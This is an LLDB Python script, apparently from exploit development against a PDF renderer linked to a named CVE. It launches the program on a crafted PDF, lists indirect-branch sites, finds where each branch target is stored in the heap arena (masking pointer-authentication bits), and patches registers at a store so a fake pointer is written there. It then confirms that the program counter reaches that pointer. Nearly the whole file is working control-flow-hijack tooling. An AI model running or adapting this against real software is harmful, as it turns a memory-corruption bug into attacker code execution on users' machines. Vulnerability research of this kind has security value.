# RIP-31: ENDGAME — census blr sites, find the arena-sourced call, hijack it.
# One launch: entry stop -> disasm census -> bp blr sites -> capture targets ->
# arena-search each target (PAC-masked) -> pick slot -> fresh run: bp +2540 AND
# the chosen blr; patch store (x2=slot, x0=FAKEPTR) -> watch PC == FAKEPTR.
import os, sys, struct, time
import lldb
t = lldb.debugger.GetSelectedTarget()
CWD = os.getcwd()
CVE = os.path.dirname(CWD) + "/cve-2026-86950"
TRACE = open(os.path.join(CWD, "rip31_trace.txt"), "a")
def T(s): print(s, flush=True); TRACE.write(s+"\n"); TRACE.flush()
err = lldb.SBError()
FAKEPTR = 0x515100000
MASK = 0xFFFFFFFFFF

def qwords(p, addr, n):
    if addr < 0x100000: return None
    m = p.ReadMemory(addr, n*8, err)
    if not err.Success() or not m: return None
    return [struct.unpack('<Q', m[i*8:i*8+8])[0] for i in range(n)]

def fresh():
    old = t.GetProcess()
    if old and old.IsValid() and old.GetState() in (lldb.eStateRunning, lldb.eStateStopped, lldb.eStateSuspended):
        old.Kill(); time.sleep(0.5)

def wait_stop(p, budget=25):
    p.Continue()
    st = p.GetState()
    t0 = time.time()
    while st == lldb.eStateRunning:
        if time.time() - t0 > budget:
            try: p.Stop(); time.sleep(0.5); st = p.GetState()
            except Exception: pass
            if st == lldb.eStateRunning:
                try: p.Kill()
                except Exception: pass
                return lldb.eStateKilled
            return st
        time.sleep(0.05); st = p.GetState()
    return st

def killp(p):
    try:
        if p and p.IsValid() and p.GetState() in (lldb.eStateRunning, lldb.eStateStopped, lldb.eStateSuspended):
            p.Kill()
    except Exception: pass

def safe_pc_addr(fr):
    try:
        a = fr.GetPCAddress().GetLoadAddress(t)
        if a is None or a < 0 or a >= (1 << 48): return None
        return a
    except Exception: return None

def pcoff(fr):
    a = safe_pc_addr(fr)
    try:
        if fr.GetSymbol() and a:
            return a - fr.GetSymbol().GetStartAddress().GetLoadAddress(t)
    except Exception: pass
    return -1

def reg(fr, name):
    r = fr.FindRegister(name)
    return r.GetValueAsUnsigned() if r and r.IsValid() else 0

def launch_and_enter(pdf):
    fresh()
    be = t.BreakpointCreateByName("aa_cache_render"); be.SetOneShot(True)
    p = t.LaunchSimple([pdf, "r.png"], None, CVE)
    if not p or not p.IsValid():
        t.BreakpointDelete(be.GetID()); return None, None, None
    th = p.GetSelectedThread()
    pc0 = safe_pc_addr(th.GetSelectedFrame())
    if not pc0:
        T("entry-pc invalid, retry once")
        killp(p); time.sleep(1.0)
        be2 = t.BreakpointCreateByName("aa_cache_render"); be2.SetOneShot(True)
        p = t.LaunchSimple([pdf, "r.png"], None, CVE)
        if not p or not p.IsValid():
            t.BreakpointDelete(be2.GetID()); return None, None, None
        th = p.GetSelectedThread()
        pc0 = safe_pc_addr(th.GetSelectedFrame())
        be = be2
    return p, pc0, be

def arena_snapshot(p, x27):
    lo = x27 - 0xC000
    qs = qwords(p, lo, 0x14000//8)
    return (lo, qs) if qs else (None, None)

def find_slot(lo, qs, target):
    if not qs: return None
    tm = target & MASK
    for j, q in enumerate(qs):
        if (q & MASK) == tm:
            return lo + j*8
    return None

# ---- PHASE-AB: census + capture in ONE launch ----
p, pc0, be = launch_and_enter("k2_d31472.pdf")
blr_sites = []; chosen = {}; hits = {}; x27 = 0; SLOTS = {}
if p and pc0:
    insts = []
    try:
        ilist = t.ReadInstructions(lldb.SBAddress(pc0, t), 1400)
        for ins in ilist:
            m = ins.GetMnemonic(target=t)
            if m.startswith("blr"):
                blr_sites.append((ins.GetAddress().GetLoadAddress(t) - pc0, m, ins.GetOperands(target=t)))
    except Exception as e:
        T("disasm err: %s" % e)
    T("A blr-sites(%d): %s" % (len(blr_sites), blr_sites[:10]))
    for off, m, ops in blr_sites[:8]:
        rn = ops.split(",")[0].strip()
        chosen[off] = rn
        t.BreakpointCreateByAddress(pc0 + off)
    if pc0:
        t.BreakpointCreateByAddress(pc0 + 1804)  # walk bp for context
    for i in range(500):
        st = wait_stop(p)
        if st != lldb.eStateStopped: break
        fr = p.GetSelectedThread().GetSelectedFrame()
        off = pcoff(fr)
        if off in chosen:
            hits[off] = hits.get(off, 0) + 1
            rn = chosen[off]
            tgt = reg(fr, rn)
            if not x27: x27 = reg(fr, "x27")
            if hits[off] <= 3:
                lo, qs = arena_snapshot(p, x27) if x27 else (None, None)
                slot = find_slot(lo, qs, tgt) if qs else None
                T("AB blr+%d hit#%d %s=%x delta=%x slot=%s" % (off, hits[off], rn, tgt, (tgt - x27) if x27 else 0, hex(slot) if slot else None))
                if slot and off not in SLOTS:
                    SLOTS[off] = (rn, slot)
            p.Continue()
        else:
            if not x27: x27 = reg(fr, "x27")
            p.Continue()
    killp(p)
if be: t.BreakpointDelete(be.GetID())
for bp in list(t.breakpoint_iter()):
    t.BreakpointDelete(bp.GetID())
T("AB hits=%s arena-sourced=%s x27=%x" % ({hex(k): v for k, v in hits.items()}, {hex(k): (v[0], hex(v[1])) for k, v in SLOTS.items()}, x27))

# ---- PHASE-C: HIJACK ----
if SLOTS:
    off_star = list(SLOTS.keys())[0]
    rn_star, slot_star = SLOTS[off_star]
    T("C hijack target: blr+%d via %s slot=%x -> FAKEPTR %x" % (off_star, rn_star, slot_star, FAKEPTR))
    p, pc0, be = launch_and_enter("k2_d31472.pdf")
    if p and pc0:
        bp_store = t.BreakpointCreateByAddress(pc0 + 2540)
        bp_blr = t.BreakpointCreateByAddress(pc0 + off_star)
        patched = False; ns = 0; result = "no-patch"
        for i in range(800):
            st = wait_stop(p)
            if st != lldb.eStateStopped:
                result = "ended st=%s rc=%s" % (st, p.GetExitStatus() if p.IsValid() else -1); break
            fr = p.GetSelectedThread().GetSelectedFrame()
            off = pcoff(fr)
            if off == 2540 and not patched:
                ns += 1
                if ns >= 5:  # warm state
                    x2r = fr.FindRegister("x2"); x0r = fr.FindRegister("x0")
                    x2r.SetValueFromCString("0x%x" % slot_star)
                    x0r.SetValueFromCString("0x%x" % FAKEPTR)
                    patched = True
                    T("C PATCH store#%d: x2->%x x0->%x" % (ns, slot_star, FAKEPTR))
                p.Continue()
            elif off == off_star:
                tgt = reg(fr, rn_star)
                T("C blr+%d reached %s=%x" % (off_star, rn_star, tgt))
                if (tgt & MASK) == FAKEPTR:
                    result = "ARMED-REACHED (blr saw FAKEPTR pre-call)"
                p.Continue()
            else:
                desc = p.GetSelectedThread().GetStopDescription(300) or ""
                pc = safe_pc_addr(fr) or 0
                if (pc & MASK) == FAKEPTR:
                    result = "PC-CONTROL-CONFIRMED pc=%x" % pc
                    T("C %s" % result); killp(p); break
                if desc and ("EXC_BAD_ACCESS" in desc or "EXC_BREAKPOINT" in desc):
                    fa = 0
                    if "address=" in desc:
                        try: fa = int(desc.split("address=")[1].split(")")[0], 16)
                        except Exception: pass
                    if (fa & MASK) == FAKEPTR:
                        result = "PC-CONTROL-CONFIRMED fault-at-FAKEPTR fa=%x" % fa
                        T("C %s" % result); killp(p); break
                p.Continue()
        killp(p)
        T("C result: %s (stores-seen=%d patched=%s)" % (result, ns, patched))
else:
    T("C SKIPPED: no arena-sourced blr found")
T("RIP-31 DONE")
TRACE.close()
